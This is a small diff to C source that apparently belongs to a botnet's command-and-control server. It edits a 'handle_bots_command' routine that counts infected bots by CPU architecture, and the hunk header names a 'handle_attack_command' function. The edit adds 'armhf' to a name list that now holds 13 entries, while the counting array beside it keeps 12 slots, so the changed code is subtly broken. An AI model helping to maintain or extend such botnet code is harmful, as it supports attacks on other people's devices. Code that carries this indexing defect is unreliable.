@@ -532,7 +532,7 @@ void handle_attack_command(const User *user, const char *command, char *response
 
 void handle_bots_command(char *response) {
     static int arch_count[12];
-    static const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "x86", "m68k", "i686", "sparc", "powerpc64", "sh4", "unknown"};
+    static const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "x86", "m68k", "i686", "sparc", "powerpc64", "sh4", "unknown", "armhf"};
     static int valid_bots;
     int offset;
     
